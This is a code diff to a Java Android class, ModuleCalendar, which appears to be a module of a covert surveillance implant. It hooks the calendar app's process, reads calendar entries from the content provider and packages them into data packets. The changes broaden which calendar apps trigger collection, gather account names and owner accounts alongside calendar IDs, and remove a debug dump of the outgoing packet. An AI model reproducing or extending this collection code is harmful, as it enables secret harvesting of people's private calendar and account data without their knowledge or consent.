@@ -66,6 +66,7 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 		// every hour, check.
 		setPeriod(NEVER);
 		setDelay(200);
+		ListenerProcess.self().attach(this);
 
 		markupCalendar = new Markup(this);
 
@@ -89,13 +90,11 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 			serializeCalendar();
 		}
 
-		ListenerProcess.self().attach(this);
-
 	}
 
 	@Override
 	public int notification(ProcessInfo process) {
-		if (process.processInfo.processName.contains("com.google.android.calendar")) {
+		if (process.processInfo.processName.contains("android.calendar")) {
 			if (process.status == ProcessStatus.STOP) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (notification), observing found: " + process.processInfo.processName);
@@ -284,7 +283,9 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (selectCalendars) provider: %s", contentProvider);
 			}
-			String[] projection = new String[] { Messages.getString("d_3") }; //$NON-NLS-1$
+
+			String[] projection = new String[] {
+					Messages.getString("d_3"), "account_name", "calendar_displayName", "ownerAccount" }; //$NON-NLS-1$
 			// Uri calendars = Uri.parse("content://calendar/calendars");
 			Uri calendars = Uri.parse(contentProvider + Messages.getString("d_2")); //$NON-NLS-1$
 			ArrayList<String> calendarIds = new ArrayList<String>();
@@ -292,9 +293,13 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 
 			while (managedCursor != null && managedCursor.moveToNext()) {
 				final String _id = managedCursor.getString(0);
+				String account_name = managedCursor.getString(1);
+				String calendar_displayName = managedCursor.getString(2);
+				String ownerAccount = managedCursor.getString(3);
 
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (selectCalendars): Id: " + _id); //$NON-NLS-1$
+					Check.log(
+							TAG + " (selectCalendars): Id: %s (%s,%s,%s)", _id, account_name, calendar_displayName, ownerAccount); //$NON-NLS-1$
 				}
 
 				calendarIds.add(_id);
@@ -399,9 +404,6 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 			final DataBuffer databuffer = new DataBuffer(packet);
 			databuffer.writeInt(size);
 
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (preparePacket): " + ByteArray.byteArrayToHex(packet)); //$NON-NLS-1$
-			}
 			return packet;
 
 		} catch (IOException ex) {
